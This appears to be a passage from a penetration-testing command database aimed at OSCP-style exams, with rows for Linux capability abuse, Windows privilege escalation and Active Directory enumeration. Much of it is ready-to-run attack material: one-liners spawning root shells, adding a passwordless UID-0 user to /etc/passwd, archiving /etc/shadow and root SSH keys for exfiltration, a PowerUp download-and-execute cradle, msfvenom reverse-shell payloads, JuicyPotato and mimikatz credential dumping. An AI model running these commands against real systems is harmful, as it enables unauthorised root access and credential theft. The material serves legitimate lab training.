# See specific commands below for each capability type","Execute capability exploitation using documented GTFOBins technique. Each capability/binary combination requires different command syntax. This is the actual privilege escalation step where the capability is abused to perform privileged operations like spawning root shell, editing sensitive files, or reading protected data.","privilege-escalation","# Command depends on capability type and binary:
# TEMPLATE: /usr/bin/python3.8 [capability-specific-arguments]
# See specific commands below for each capability type","SPECIFIC EXPLOITATION COMMANDS BY CAPABILITY:

cap_setuid + python/python3:
/usr/bin/python3 -c 'import os;
os.setuid(0);
os.system(""/bin/bash"")'
Result:
Spawns root shell immediately.

cap_setuid + perl:
/usr/bin/perl -e 'use POSIX qw(setuid);
POSIX::setuid(0);
exec ""/bin/bash"";'
Result:
Spawns root shell.

cap_setuid + ruby:
/usr/bin/ruby -e 'Process::Sys.setuid(0);
exec ""/bin/bash""'
Result:
Spawns root shell.

cap_setuid + node:
/usr/bin/node -e 'process.setuid(0);
require(""child_process"").spawn(""/bin/bash"", {stdio:
[0, 1, 2]});'
Result:
Spawns root shell.

cap_setuid + php:
/usr/bin/php -r ""posix_setuid(0);
system('/bin/bash');""
Result:
Spawns root shell.

cap_dac_override + vim:
/usr/bin/vim.basic /etc/passwd
Then:
Add line:
hacker:x:0:0::/root:/bin/bash
Then:
su hacker (no password)
Result:
Root access via UID 0 user.

cap_dac_override + nano:
/usr/bin/nano /etc/passwd
Same as vim - add UID 0 user.

cap_dac_read_search + tar:
/usr/bin/tar -czf /tmp/shadow.tar.gz /etc/shadow
/usr/bin/tar -czf /tmp/ssh.tar.gz /root/.ssh/id_rsa
Result:
Sensitive files archived for exfiltration.

cap_dac_read_search + base64:
/usr/bin/base64 /etc/shadow | base64 -d
/usr/bin/base64 /root/.ssh/id_rsa
Result:
File contents exfiltrated.

cap_sys_ptrace + gdb:
Find root process:
ps aux | grep root
/usr/bin/gdb -p <root_pid>
Then:
call (void)system(""cp /bin/bash /tmp/rootbash;
chmod +xs /tmp/rootbash"")
Result:
SUID root shell created.

cap_sys_admin + mount:
Advanced - mount privileged filesystem or overlay /etc
Requires deep understanding of mount namespaces.","Critical - This is the actual exploitation step. Must be executed correctly with exact syntax. Practice common patterns (python setuid, vim dac_override) as these appear frequently in OSCP-like environments.","","","","{""Root shell doesn't spawn"": ""Check if shell spawned but without root prompt. Try: id and whoami to verify UID. May need interactive TTY upgrade."", ""File edit fails despite cap_dac_override"": ""Verify capability has +e (effective) bit set. Check AppArmor/SELinux status: aa-status or getenforce"", ""Technique works but not root"": ""Some capabilities give partial access. cap_dac_read_search reads files but doesn't give root shell. Use to read shadow and crack passwords instead."", ""Binary not executable"": ""Check if binary is actually executable (not just readable). Try: file <CAP_BINARY> to verify it's ELF binary.""}","","","",""
"verify-cap-access","Verify Elevated Access from Capability Exploitation","post-exploit","whoami && id && cat /etc/shadow 2>/dev/null | head -n 3","Verify successful privilege escalation after capability exploitation. Test multiple indicators: effective UID via whoami, full UID/GID/groups via id, ability to read root-protected files like /etc/shadow. This confirms level of access achieved and whether full root or partial privilege escalation succeeded.","privilege-escalation","","Different capabilities grant different levels of access:

cap_setuid:
Full root shell (uid=0, all access).

cap_dac_override:
Full root file access (read+write any file).

cap_dac_read_search:
Read-only root file access (shadow, SSH keys).

cap_sys_ptrace:
Indirect root via process injection.

If shadow file readable, priority actions:

1.
Copy full shadow file for offline password cracking.

2.
Extract root user hash:
cat /etc/shadow | grep '^root:'

3.
Use john or hashcat to crack:
john --wordlist=rockyou.txt shadow.txt

4.
Look for users with empty password fields (:::: format).

If root SSH key accessible:

1.
Copy /root/.ssh/id_rsa to attacker machine.

2.
Set correct permissions:
chmod 600 id_rsa.

3.
SSH as root:
ssh -i id_rsa root@target.

For OSCP:
Screenshot evidence of uid=0 and shadow/flag file access.","Critical - Must verify root access for proof. Take screenshots showing uid=0 and flag file contents. Shadow file access proves privileged read, which can lead to password cracking for persistent access.","","","","{""whoami shows root but can't read shadow"": ""May be in restricted environment. Try: cat /proc/self/status | grep Uid to see all UIDs (real, effective, saved)."", ""id shows uid=0 but prompt still shows $"": ""Effective UID is root but shell prompt not updated. This is normal. Verify with file access tests instead of prompt."", ""Partial access only (can read but not write)"": ""Expected for cap_dac_read_search (read-only). Exfiltrate shadow file and crack passwords offline instead."", ""Permission denied despite uid=0"": ""AppArmor or SELinux may be restricting root capabilities. Check: aa-status or getenforce""}","{""whoami"": ""Display effective username. Should show 'root' if UID 0 achieved. No flags needed."", ""id"": ""Display user identity: UID, GID, and group memberships. Shows uid=0(root) if full root achieved. No flags needed."", ""cat /etc/shadow"": ""Read shadow password file (requires root). Tests read access to root-protected files."", ""2>/dev/null"": ""Suppress errors if shadow unreadable (indicates partial escalation only)."", ""| head -n 3"": ""Show first 3 lines only (root, daemon, bin users). Reduces output clutter while proving access.""}","","",""
"cap-exploit-dac-override-passwd-edit","Exploit cap_dac_override by Editing /etc/passwd","post-exploit","<CAP_BINARY> /etc/passwd","Exploit cap_dac_override capability to bypass file permissions and edit /etc/passwd. Add a new user with UID 0 (root) and no password, then switch to that user for root access. This technique works with text editors (vim, nano) that have cap_dac_override set. Alternative to spawning root shell directly.","privilege-escalation","/usr/bin/vim.basic /etc/passwd","/etc/passwd line format:
username:x:UID:GID:GECOS:homedir:shell

For instant root:
hacker:x:0:0::/root:/bin/bash

username:
hacker (or any name).

x:
placeholder (actual password in /etc/shadow).

UID:
0 (root user ID - critical).

GID:
0 (root group ID).

GECOS:
empty (full name field).

homedir:
/root (root's home).

shell:
/bin/bash (login shell).

After adding line, use:
su hacker (no password required).

Alternative:
Remove root password entirely:

Change:
root:x:0:0:root:/root:/bin/bash

To:
root::0:0:root:/root:/bin/bash

Then:
su root (no password).

cap_dac_override bypasses Discretionary Access Control (DAC).

DAC = traditional Unix file permissions (owner, group, other).

Does NOT bypass Mandatory Access Control (MAC) like SELinux/AppArmor.

Editors other than vim/nano may work:
emacs, ed, sed with -i flag.

More stealthy than spawning root shell (less obvious in process list).","High - Alternative technique when cap_setuid not available. Commonly tested on OSCP boxes with vim or nano having cap_dac_override. Must know /etc/passwd format and UID 0 concept.","","","","{""File opens read-only"": ""Check capability has +e (effective) bit: getcap <CAP_BINARY>. Need +ep not just +p"", ""Cannot save changes"": ""Try alternative editor if available. Check disk space: df -h. Verify filesystem not read-only: mount | grep '/'"", ""New user not recognized"": ""Check /etc/passwd syntax. Format: username:x:UID:GID:comment:home:shell. Ensure UID is 0 for root."", ""su hacker asks for password"": ""Check /etc/shadow - may have password set. Edit passwd line to: hacker::0:0::/root:/bin/bash (empty password field).""}","{""/etc/passwd"": ""User account database file. Contains usernames, UIDs, GIDs, home directories, and shells. Normally writable only by root, but cap_dac_override bypasses this protection.""}","","",""
"win-privesc-winpeas","WinPEAS - Automated Enumeration","post-exploit","winPEASany.exe","Comprehensive automated privilege escalation enumeration for Windows","windows","","Transfer via certutil, PowerShell download, or SMB share","high","","","","","{""quiet"": ""Reduce output verbosity"", ""cmd"": ""Execute specific checks only"", ""notcolor"": ""Disable colored output""}","[""certutil-download""]","[""win-privesc-powerup""]","[""win-unquoted-service-paths"", ""win-always-install-elevated"", ""win-potato-exploits""]"
"win-privesc-powerup","PowerUp - PowerShell Enumeration","post-exploit","powershell -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1'); Invoke-AllChecks""","PowerShell-based privilege escalation scanner","windows","powershell -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerUp.ps1'); Invoke-AllChecks""","Part of PowerSploit framework - download from GitHub","high","","","","","{""-ep bypass"": ""Bypass execution policy"", ""-c"": ""Execute command"", ""IEX"": ""Invoke-Expression (run downloaded script)"", ""Invoke-AllChecks"": ""Run all PowerUp checks""}","[""evil-winrm-shell"", ""download-powerup""]","[""win-privesc-winpeas""]","[""windows-unquoted-service"", ""windows-alwaysinstallelevated"", ""windows-autologon""]"
"win-systeminfo","System Information Gathering","post-exploit","systeminfo && hostname && whoami /all","Gather basic system information for privilege escalation planning","windows","","SeImpersonate/SeAssignPrimaryToken = Potato exploit candidates","high","","","","","{""systeminfo"": ""Display detailed system configuration"", ""hostname"": ""Display computer name"", ""whoami /all"": ""Display user, groups, and privileges""}","","[""windows-whoami-privs""]","[""win-kernel-exploits"", ""win-potato-exploits""]"
"win-unquoted-service-paths","Find Unquoted Service Paths","post-exploit","wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v ""C:\Windows\\"" | findstr /i /v """"""""","Find services with unquoted paths containing spaces (exploitable)","windows","","Example:
C:\Program Files\My Service\service.exe tries C:\Program.exe first","high","","","","","{""wmic service get"": ""Query service properties"", ""findstr /i auto"": ""Filter for auto-start services (case-insensitive)"", ""findstr /i /v"": ""Exclude lines containing pattern"", ""/v \""\""\""\"""": ""Exclude properly quoted paths""}","","[""get-unquotedservice""]",""
"win-weak-service-perms","Check Service Permissions","post-exploit","accesschk.exe -uwcqv ""Authenticated Users"" * /accepteula","Find services with weak permissions (modifiable by current user)","windows","","Download accesschk from Sysinternals or use PowerShell alternatives","high","","","","","{""-u"": ""Suppress errors"", ""-w"": ""Show only objects with write access"", ""-c"": ""Check services"", ""-q"": ""Omit banner"", ""-v"": ""Verbose output""}","","[""get-modifiableservicefile""]",""
"win-always-install-elevated","Check AlwaysInstallElevated","post-exploit","reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated && reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated","Check if AlwaysInstallElevated is enabled (allows MSI as SYSTEM)","windows","","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > payload.msi","high","","","","","{""reg query"": ""Query registry key"", ""HKCU"": ""HKEY_CURRENT_USER registry hive"", ""HKLM"": ""HKEY_LOCAL_MACHINE registry hive"", ""/v"": ""Query specific value""}","","[""win-potato-exploits"", ""win-unquoted-service-paths""]",""
"win-registry-autologon","Search Registry for Passwords","post-exploit","reg query HKLM /f password /t REG_SZ /s && reg query HKCU /f password /t REG_SZ /s","Search registry for stored passwords (autologon, VNC, etc.)","windows","","Check specifically:
Winlogon, VNC, Putty, SNMP keys","medium","","","","","{""/f password"": ""Search for 'password' string"", ""/t REG_SZ"": ""Search in string values only"", ""/s"": ""Search recursively""}","","",""
"win-scheduled-tasks","Enumerate Scheduled Tasks","post-exploit","schtasks /query /fo LIST /v && dir C:\windows\system32\tasks","List scheduled tasks that may be exploitable","windows","","Pay attention to tasks with SYSTEM privileges and writable paths","medium","","","","","{""/query"": ""Display scheduled tasks"", ""/fo LIST"": ""Format as list"", ""/v"": ""Verbose output"", ""dir tasks"": ""List task files directly""}","","",""
"win-dll-hijacking","DLL Hijacking Opportunities","post-exploit","dir /s /b C:\*.dll 2>nul | findstr /v ""C:\Windows"" && echo Check PATH directories","Find potential DLL hijacking opportunities","windows","","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> -f dll > evil.dll","medium","","","","","{""dir /s /b"": ""Search subdirectories, bare format"", ""C:\\*.dll"": ""Find all DLL files"", ""findstr /v"": ""Exclude Windows directory""}","","",""
"win-potato-exploits","Check for Potato Exploit Eligibility","post-exploit","whoami /priv | findstr /i ""SeImpersonate SeAssignPrimaryToken""","Check for privileges needed for Potato-family exploits","windows","","IIS, SQL Server service accounts commonly have these privileges","high","","","","","{""whoami /priv"": ""List user privileges"", ""findstr /i"": ""Case-insensitive search"", ""SeImpersonate"": ""Impersonate a client after authentication"", ""SeAssignPrimaryToken"": ""Replace process-level token""}","[""windows-whoami-privs""]","[""win-always-install-elevated""]",""
"win-kernel-exploits","Check for Kernel Exploits","post-exploit","systeminfo > systeminfo.txt && python3 windows-exploit-suggester.py --database <DATE>-mssb.xls --systeminfo systeminfo.txt","Identify missing patches and applicable kernel exploits","windows","systeminfo > systeminfo.txt && python3 windows-exploit-suggester.py --database 2024-01-15-mssb.xls --systeminfo systeminfo.txt","Update database:
python windows-exploit-suggester.py --update","medium","","","","","{""--database"": ""Microsoft security bulletin database"", ""--systeminfo"": ""Path to systeminfo output""}","","",""
"win-saved-credentials","Check Saved Credentials","post-exploit","cmdkey /list && dir C:\Users\*\AppData\Local\Microsoft\Credentials\* && dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\*","Find saved Windows credentials that can be reused","windows","","runas /savecred /user:DOMAIN\Admin ""cmd.exe"" if admin creds cached","medium","","","","","{""cmdkey /list"": ""List saved credentials"", ""AppData\\Local\\Credentials"": ""Local credential storage"", ""AppData\\Roaming\\Credentials"": ""Roaming credential storage""}","","",""
"win-password-files","Search for Password Files","post-exploit","dir /s /b C:\*password* C:\*cred* C:\*vnc* C:\*.config 2>nul | findstr /v ""[System32 SysWOW64]""","Search filesystem for files potentially containing passwords","windows","","Also check: unattend.xml, sysprep.inf, web.config","medium","","","","","{""dir /s /b"": ""Search subdirectories, bare format"", ""C:\\*password*"": ""Files with 'password' in name"", ""findstr /v"": ""Exclude system directories""}","","",""
"win-sam-system-backup","Check for SAM/SYSTEM Backups","post-exploit","dir /s /b C:\SAM C:\SYSTEM 2>nul && reg save HKLM\SAM sam.hiv && reg save HKLM\SYSTEM system.hiv","Find or create SAM/SYSTEM backups for offline password cracking","windows","","secretsdump.py -sam sam.hiv -system system.hiv LOCAL","high","","","","","{""dir /s /b"": ""Search for existing backups"", ""reg save"": ""Create registry hive backup"", ""HKLM\\SAM"": ""Security Accounts Manager hive"", ""HKLM\\SYSTEM"": ""System hive (contains boot key)""}","[""evil-winrm-shell""]","[""ad-sam-dump-reg-save"", ""crackmapexec-sam-dump""]","[""impacket-secretsdump"", ""hashcat-ntlm-crack""]"
"win-group-membership","Check Privileged Group Membership","post-exploit","net user <USERNAME> && net localgroup administrators && whoami /groups","Check user's group memberships for privilege escalation opportunities","windows","net user currentuser && net localgroup administrators && whoami /groups","Backup Operators can read any file, Server Operators can modify services","high","","","","","{""net user"": ""Display user account information"", ""net localgroup"": ""Display members of local group"", ""whoami /groups"": ""Display current user's groups""}","[""evil-winrm-shell""]","[""powerview-get-netgroup""]","[""impacket-getuserspns-kerberoast"", ""powerview-find-localadminaccess""]"
"windows-whoami-privs","Check Current Privileges","post-exploit","whoami /priv","List current user privileges on Windows","windows","","SeImpersonatePrivilege = instant win on older Windows","high","","","","","{""/priv"": ""Display privileges of current user"", ""/groups"": ""Display group membership (alternative)"", ""/all"": ""Display all information""}","","[""whoami-all""]",""
"windows-systeminfo","System Information Gathering","post-exploit","systeminfo | findstr /B /C:""OS Name"" /C:""OS Version"" /C:""System Type""","Get Windows version for exploit research","windows","","Save full output for Windows Exploit Suggester","high","","","","","{""systeminfo"": ""Display detailed system configuration"", ""findstr"": ""Filter output for specific lines"", ""/B"": ""Match beginning of line"", ""/C:"": ""Literal search string""}","","[""get-computerinfo""]",""
"windows-unquoted-service","Find Unquoted Service Paths","post-exploit","wmic service get name,displayname,pathname,startmode | findstr /i ""auto"" | findstr /i /v ""C:\Windows\\"" | findstr /i /v ""\""""","Find services with unquoted paths for privilege escalation","windows","","Requires write access to parent directory","high","","","","","{""wmic"": ""Windows Management Instrumentation Command"", ""findstr /i"": ""Case insensitive search"", ""/v"": ""Inverse match (exclude)"", ""\\\""\"""": ""Find paths without quotes""}","[""win-systeminfo""]","[""win-unquoted-service-paths"", ""get-unquotedservice""]","[""win-weak-service-perms"", ""win-sc-query-config""]"
"windows-alwaysinstallelevated","Check AlwaysInstallElevated","post-exploit","reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated","Check if MSI files install with SYSTEM privileges","windows","","Both keys must be set for exploitation","high","","","","","{""reg query"": ""Query registry values"", ""HKLM"": ""HKEY_LOCAL_MACHINE hive"", ""HKCU"": ""HKEY_CURRENT_USER hive"", ""/v"": ""Query specific value name""}","[""get-itemproperty"", ""evil-winrm-shell""]","[""win-privesc-winpeas"", ""win-privesc-powerup""]","[""msfvenom-windows-meterpreter-tcp""]"
"windows-scheduled-tasks","Enumerate Scheduled Tasks","post-exploit","schtasks /query /fo LIST /v | findstr /C:""Task To Run"" /C:""Run As User""","Find scheduled tasks running as SYSTEM","windows","","Focus on tasks with writable binaries/scripts","high","","","","","{""/query"": ""Display scheduled tasks"", ""/fo LIST"": ""Format output as list"", ""/v"": ""Verbose output with all properties""}","[""win-systeminfo""]","[""get-scheduledtask"", ""win-schtasks-list-all"", ""win-wmic-scheduled-job""]","[""win-schtasks-task-xml"", ""powershell-runas-basic""]"
"windows-service-permissions","Check Service Permissions","post-exploit","accesschk.exe -uwcqv ""Authenticated Users"" * /accepteula","Find services with weak permissions","windows","","Download accesschk from Sysinternals","high","","","","","{""-u"": ""Suppress errors"", ""-w"": ""Show only writable objects"", ""-c"": ""Service objects"", ""-q"": ""Quiet/minimal output"", ""-v"": ""Verbose"", ""/accepteula"": ""Auto accept EULA""}","","[""sc-sdshow-service""]",""
"windows-potato-attacks","Potato Attacks (JuicyPotato)","post-exploit","JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -t * -c {CLSID}","Exploit SeImpersonatePrivilege for SYSTEM shell","windows","","Works up to Windows Server 2016/Windows 10 1809

Alternative Techniques:
- sweetpotato.exe","high","","","","","{""-l"": ""Local COM server listen port"", ""-p"": ""Program to launch"", ""-t"": ""CreateProcess call type (*=try both)"", ""-c"": ""CLSID to abuse""}","[""win-systeminfo"", ""whoami-priv""]","[""win-potato-exploits""]","[""mimikatz-sekurlsa-logonpasswords"", ""ad-sam-dump-reg-save"", ""powershell-runas-basic""]"
"windows-sam-system-backup","SAM/SYSTEM Backup Files","post-exploit","dir /s /b C:\Windows\repair\SAM C:\Windows\System32\config\RegBack\SAM","Find backup SAM/SYSTEM files for hash extraction","windows","","Requires backup files or SeBackupPrivilege","high","","","","","{""/s"": ""Search subdirectories"", ""/b"": ""Bare format (paths only)"", ""SAM"": ""Security Account Manager database"", ""SYSTEM"": ""System registry hive""}","[""win-systeminfo""]","[""ad-sam-dump-reg-save"", ""crackmapexec-sam-dump""]","[""impacket-secretsdump"", ""mimikatz-sekurlsa-logonpasswords"", ""hashcat-ntlm-crack""]"
"windows-stored-credentials","Search for Stored Credentials","post-exploit","cmdkey /list","List stored credentials in Windows Credential Manager","windows","","RunAs with /savecred is powerful","high","","","","","{""/list"": ""Display all stored credentials"", ""cmdkey"": ""Windows credential manager CLI""}","[""whoami-all""]","[""windows-autologon"", ""mimikatz-sekurlsa-logonpasswords""]","[""powershell-runas-basic"", ""crackmapexec-validate-admin""]"
"windows-dpapi-masterkeys","DPAPI Master Keys","post-exploit","dir /a /s /b C:\Users\*\AppData\Roaming\Microsoft\Protect\","Find DPAPI master keys for credential decryption","windows","","Requires user password or domain backup key","medium","","","","","{""/a"": ""All files including hidden"", ""/s"": ""Recursive search"", ""/b"": ""Bare format"", ""Protect"": ""DPAPI master keys location""}","","",""
"windows-autologon","AutoLogon Credentials","post-exploit","reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" | findstr /i ""DefaultUserName DefaultDomainName DefaultPassword""","Check registry for autologon credentials","windows","","Common in kiosk/lab environments

Alternative Techniques:
- netpass.exe","high","","","","","{""reg query"": ""Query registry values"", ""Winlogon"": ""Windows logon configuration"", ""findstr /i"": ""Case insensitive search""}","[""get-itemproperty"", ""evil-winrm-shell""]","[""win-privesc-winpeas"", ""win-privesc-powerup""]","[""crackmapexec-smb-spray"", ""evil-winrm-creds""]"
"windows-pass-the-hash","Pass the Hash Attack","post-exploit","mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""","Extract NTLM hashes for pass-the-hash attacks","windows","","Requires local admin or SYSTEM","high","","","","","{""privilege::debug"": ""Enable debug privilege"", ""sekurlsa::logonpasswords"": ""Dump logon passwords/hashes"", ""exit"": ""Exit after execution""}","[""crackmapexec-sam-dump"", ""impacket-secretsdump""]","[""ad-pass-the-hash-crackmapexec"", ""ad-pass-the-hash-impacket-psexec""]","[""evil-winrm-hash"", ""crackmapexec-validate-admin""]"
"windows-kerberoasting","Kerberoasting Attack","post-exploit","setspn -T <DOMAIN> -Q */* | findstr /i service","Find service accounts for Kerberoasting","windows","setspn -T corp.local -Q */* | findstr /i service","Service account passwords often weak","high","","","","","{""setspn"": ""Service Principal Name tool"", ""-T"": ""Target domain"", ""-Q"": ""Query SPNs"", ""*/*"": ""All SPNs""}","","[""rubeus-kerberoast""]",""
"windows-dll-hijacking","DLL Hijacking Check","post-exploit","echo %PATH% & where /r C:\ *.dll 2>nul | findstr /i /c:""program files""","Find potential DLL hijacking opportunities","windows","","Common with third-party applications","medium","","","","","{""%PATH%"": ""System PATH variable"", ""where /r"": ""Recursive file search"", ""*.dll"": ""Search for DLL files""}","","",""
"get-aduser","Get Active Directory User","enumeration","Get-ADUser -Identity <USERNAME> -Properties *","Query Active Directory user account using native AD PowerShell module. Returns comprehensive user properties including group memberships, account settings, and attributes. Requires Active Directory PowerShell module to be installed.","","Get-ADUser -Identity Administrator -Properties *","Native alternative to PowerView's Get-NetUser.

Requires AD PowerShell module (part of RSAT).

For all users:
Get-ADUser -Filter * -Properties *.

For service accounts:
Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipalNames.

Manual alternative:
net user <username> /domain","high","","","","{""Module not found"": ""Install-WindowsFeature RSAT-AD-PowerShell (Server) or RSAT (Desktop)"", ""Cannot find user"": ""Verify username spelling or use -Filter for wildcard search"", ""Access denied"": ""User may lack read permissions on user objects"", ""No domain controller"": ""Check network connectivity: nltest /dclist:<domain>""}","{""-Identity"": ""Specific user to query (SamAccountName, DN, GUID, or SID)"", ""-Filter"": ""Filter criteria (use * for all users, 'Enabled -eq $true' for active users)"", ""-Properties"": ""Properties to retrieve (* for all, or comma-separated list)"", ""-SearchBase"": ""LDAP path to search within (e.g., 'OU=Users,DC=domain,DC=local')""}","[""import-module-activedirectory""]","[""powerview-get-netuser"", ""net-user-domain-list""]","[""get-adgroup"", ""get-adgroupmember""]"
"get-adgroup","Get Active Directory Group","enumeration","Get-ADGroup -Identity ""<GROUPNAME>"" -Properties *","Query Active Directory group information using native AD PowerShell module. Returns group properties, members, and group scope. Critical for identifying privileged groups and their memberships.","","Get-ADGroup -Identity ""Domain Admins"" -Properties *","OSCP Priority Groups:
'Domain Admins', 'Enterprise Admins', 'Backup Operators', 'Account Operators', 'Server Operators'.

Native alternative to PowerView's Get-NetGroup.

For all groups:
Get-ADGroup -Filter * -Properties *.

Manual alternative:
net group ""<group>"" /domain","high","","","","{""Module not found"": ""Install-WindowsFeature RSAT-AD-PowerShell"", ""Cannot find group"": ""Try wildcard: Get-ADGroup -Filter 'Name -like \""*Admin*\""'"", ""Access denied"": ""User lacks read permissions on group objects""}","{""-Identity"": ""Group name, DN, GUID, or SID to query"", ""-Filter"": ""Filter criteria (e.g., * for all, 'GroupCategory -eq \""Security\""')"", ""-Properties"": ""Properties to retrieve (* for all)"", ""-SearchBase"": ""LDAP search base""}","[""import-module-activedirectory""]","[""powerview-get-netgroup"", ""net-group-domain-list""]","[""get-adgroupmember""]"
"get-adgroupmember","Get Active Directory Group Members","enumeration","Get-ADGroupMember -Identity ""<GROUPNAME>"" -Recursive","Retrieve members of an Active Directory group including nested group memberships. The -Recursive flag expands nested groups to show all effective members. Critical for mapping privilege escalation paths.","","Get-ADGroupMember -Identity ""Domain Admins"" -Recursive","Native alternative to PowerView's Get-NetGroupMember.

Always use -Recursive to find nested memberships (users in Group A which is member of Group B).

Critical for OSCP AD enumeration.

Manual alternative:
net group ""<group>"" /domain (shows direct members only)","high","","","","{""Module not found"": ""Install-WindowsFeature RSAT-AD-PowerShell"", ""Empty result"": ""Remove -Recursive to see only direct members"", ""Access denied"": ""User lacks read permissions on group objects""}","{""-Identity"": ""Group name, DN, GUID, or SID"", ""-Recursive"": ""Expand nested groups to show all effective members""}","[""import-module-activedirectory""]","[""powerview-get-netgroupmember"", ""net-group-domain-list""]","[""get-aduser""]"
"get-adcomputer","Get Active Directory Computer","enumeration","Get-ADComputer -Filter * -Properties *","Query Active Directory computer objects including workstations, servers, and domain controllers. Returns detailed system information for lateral movement targeting.","","","Native alternative to PowerView's Get-NetComputer.

Focus on servers for OSCP:
Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties *.

For domain controllers:
Get-ADDomainController -Filter *.

Manual alternative:
net view for basic computer list","high","","","","{""Module not found"": ""Install-WindowsFeature RSAT-AD-PowerShell"", ""Too much output"": ""Filter by OS: Get-ADComputer -Filter 'OperatingSystem -like \""*Server*\""'"", ""Access denied"": ""User lacks read permissions on computer objects""}","{""-Filter"": ""Filter criteria (* for all, 'OperatingSystem -like \""*Server*\""' for servers)"", ""-Properties"": ""Properties to retrieve (* for all)"", ""-SearchBase"": ""LDAP search base (e.g., 'OU=Servers,DC=domain,DC=local')""}","[""import-module-activedirectory""]","[""powerview-get-netcomputer""]","[""ad-pass-the-hash-impacket-psexec"", ""ad-pass-the-hash-crackmapexec"", ""windows-net-use-smb-connect""]"
"get-ciminstance","Get CIM Instance","enumeration","Get-CimInstance -ClassName <CLASSNAME>","Query Windows Management Instrumentation (WMI) classes using CIM cmdlets. Modern replacement for Get-WmiObject. Retrieves system information including processes, services, hardware, installed software, and configuration.","","Get-CimInstance -ClassName Win32_Process","OSCP Key Classes:
Win32_Process (processes), Win32_Service (services), Win32_OperatingSystem (system info), Win32_StartupCommand (persistence).

Avoid Win32_Product (triggers consistency check).

Modern replacement for Get-WmiObject (deprecated).

For remote queries:
Get-CimInstance -ClassName Win32_Process -ComputerName <TARGET>","high","","","","{""Invalid class"": ""Verify class name: Get-CimClass -ClassName Win32_*"", ""Access denied"": ""Some classes require admin privileges"", ""Very slow"": ""Avoid Win32_Product - use registry query instead""}","{""-ClassName"": ""WMI class name to query (e.g., Win32_Process, Win32_Service)"", ""-Filter"": ""WQL filter (e.g., 'Name=\""svchost.exe\""')"", ""-ComputerName"": ""Query remote computer (requires admin access)"", ""-Namespace"": ""WMI namespace (default: root\\cimv2)""}","","","[""get-service"", ""get-process"", ""get-hotfix""]"
"get-computerinfo","Get Computer Information","enumeration","Get-ComputerInfo","Retrieve comprehensive system information including OS details, hardware configuration, domain membership, and installed hotfixes. PowerShell 5.1+ cmdlet that consolidates multiple system queries into single output.","","","OSCP Quick Enum:
Fast one-liner for system overview.

Check OsVersion for patch level (compare against exploit-db), CsDomain for AD environment, OsArchitecture for payload architecture.

Output is verbose - filter with -Property or Select-Object.

Faster alternatives:
systeminfo or Get-CimInstance Win32_OperatingSystem","medium","","","","{""Cmdlet not found"": ""Requires PowerShell 5.1+. Use systeminfo or Get-CimInstance Win32_OperatingSystem"", ""Very slow"": ""Filter specific properties: Get-ComputerInfo -Property Os*"", ""Missing data"": ""Run as admin for complete hardware details""}","{""-Property"": ""Specific properties to retrieve (e.g., -Property OsName,OsVersion)""}","","[""win-systeminfo"", ""get-ciminstance""]","[""get-hotfix""]"
"get-itemproperty","Get Registry Item Property","enumeration","Get-ItemProperty -Path <REGISTRY_PATH>","Read Windows Registry values from specified registry key path. Critical for discovering credentials, configuration settings, installed software, and privilege escalation vectors stored in registry.","","Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","OSCP Critical Paths:
AlwaysInstallElevated (HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer - check AlwaysInstallElevated=1), Winlogon credentials (HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon - DefaultUserName/DefaultPassword), Service paths (HKLM:\System\CurrentControlSet\Services\<service> - ImagePath for unquoted paths).

Manual alternative:
reg query <path> /v <value>","high","","","","{""Path not found"": ""Verify key exists: Test-Path <REGISTRY_PATH>"", ""Access denied"": ""Try HKCU: instead of HKLM: or run as admin"", ""Wrong format"": ""Use PowerShell drive notation: HKLM:\\ not HKEY_LOCAL_MACHINE\\""}","{""-Path"": ""Registry path using PowerShell drive notation (HKLM:, HKCU:, HKCR:, HKU:, HKCC:)"", ""-Name"": ""Specific property name to retrieve (omit for all properties)""}","[""evil-winrm-shell""]","[""get-itemproperty"", ""windows-search-sensitive-files""]","[""windows-autologon"", ""windows-alwaysinstallelevated"", ""get-acl""]"
"get-acl","Get Access Control List","enumeration","Get-Acl -Path <PATH>","Retrieve Access Control List (ACL) for file system objects, registry keys, or Active Directory objects. Shows permissions (DACL), ownership, and access rights. Critical for identifying privilege escalation via weak permissions.","","Get-Acl -Path C:\Program Files\VulnerableApp","OSCP PrivEsc:
Look for services with writable binary paths, Program Files directories with Modify/Write for Users, registry keys with Full Control for non-admins.

Key permissions:
FullControl (full access), Modify (write/delete), Write (create/modify).

Check current user's effective permissions:
(Get-Acl <PATH>).Access | Where-Object {$_.IdentityReference -like '*Users*'}.

Manual alternative:
icacls <path>","high","","","","{""Access denied"": ""User may lack read permissions on ACL (unusual)"", ""Path not found"": ""Verify path exists: Test-Path <PATH>"", ""Unreadable output"": ""Format: Get-Acl <PATH> | Format-List or pipe to Select-Object -ExpandProperty Access""}","{""-Path"": ""File system path, registry path (HKLM:\\), or AD path (AD:\\)""}","","[""powerview-get-objectacl"", ""ad-acl-enumeration-by-sid""]","[""powerview-get-objectacl-genericall"", ""powerview-get-objectacl-writeowner""]"
"get-scheduledtask","Get Scheduled Tasks","enumeration","Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'}","Enumerate Windows scheduled tasks including task names, states, triggers, actions, and principals. Critical for identifying privilege escalation via task hijacking and persistence mechanisms.","","","OSCP PrivEsc:
Find tasks running as SYSTEM/admin with writable binaries.

Check Actions property for executable paths, verify permissions with Get-Acl.

Common vectors:
